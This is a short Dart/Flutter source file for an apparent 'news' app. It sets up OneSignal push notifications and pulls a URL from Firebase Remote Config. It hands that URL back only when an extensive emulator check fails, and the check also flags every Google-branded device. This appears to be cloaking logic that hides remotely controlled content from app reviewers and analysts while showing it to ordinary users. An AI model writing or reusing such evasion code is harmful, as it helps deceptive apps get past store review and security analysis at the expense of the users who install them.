import 'package:device_info/device_info.dart';
import 'package:firebase_remote_config/firebase_remote_config.dart';
import 'package:onesignal_flutter/onesignal_flutter.dart';

class NewsApp {
  static DeviceInfoPlugin devinfo = DeviceInfoPlugin();

  static initNotify() async {
    try {
      await OneSignal.shared.promptUserForPushNotificationPermission();
      await OneSignal.shared.setAppId("7091da78-cba7-4989-bcdb-71c3b9b12485");
    } catch (ex) {
      throw Exception(ex);
    }
  }

  static builder() async {
    try {
      String str = await remote();
      bool ch = await checkIsEmu();

      if (str.isEmpty || ch) {
        return '';
      } else {
        return str;
      }
    } catch (ex) {
      throw Exception(ex);
    }
  }

  static checkIsEmu() async {
    final em = await devinfo.androidInfo;

    var phoneModel = em.model;
    var buildProduct = em.product;
    var buildHardware = em.hardware;

    var result = (em.fingerprint.startsWith("generic") ||
        phoneModel.contains("google_sdk") ||
        phoneModel.contains("droid4x") ||
        phoneModel.contains("Emulator") ||
        phoneModel.contains("Android SDK built for x86") ||
        em.manufacturer.contains("Genymotion") ||
        buildHardware == "goldfish" ||
        buildHardware == "vbox86" ||
        buildProduct == "sdk" ||
        buildProduct == "google_sdk" ||
        buildProduct == "sdk_x86" ||
        buildProduct == "vbox86p" ||
        em.brand.contains('google') ||
        em.board.toLowerCase().contains("nox") ||
        em.bootloader.toLowerCase().contains("nox") ||
        buildHardware.toLowerCase().contains("nox") ||
        !em.isPhysicalDevice ||
        buildProduct.toLowerCase().contains("nox"));

    if (result) return true;
    result = result ||
        (em.brand.startsWith("generic") && em.device.startsWith("generic"));
    if (result) return true;
    result = result || ("google_sdk" == buildProduct);
    return result;
  }

  static Future<String> remote() async {
    final RemoteConfig remoteConfig = RemoteConfig.instance;
    await remoteConfig.fetch();
    await remoteConfig.activate();
    return remoteConfig.getString('url');
  }
}
